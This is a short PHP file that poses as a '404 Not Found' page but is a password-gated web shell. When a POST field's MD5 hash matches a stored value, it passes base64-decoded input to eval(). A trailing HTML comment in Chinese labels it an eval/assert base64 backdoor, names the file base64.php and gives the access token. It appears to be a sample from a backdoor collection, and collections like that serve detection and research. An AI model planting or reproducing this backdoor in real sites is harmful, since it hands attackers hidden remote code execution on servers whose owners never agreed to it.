<?php 
echo "404 Not Found!</br>"; error_reporting(0);
if(isset($_POST['com']) && 
    md5($_POST['com']) == '791dc312b38016ef998c1c146104cd5a' &&
     isset($_POST['content'])) 
     eval(base64_decode($content));
echo "We're sorry but the page your are looking for is Not Found..."
?>  

<!-- 
灭绝师太
===================
文件路径	后门代码	后门描述
base64.php	eval(base64_decode($content));	eval|assert(base64加密后门

com = settoken
 -->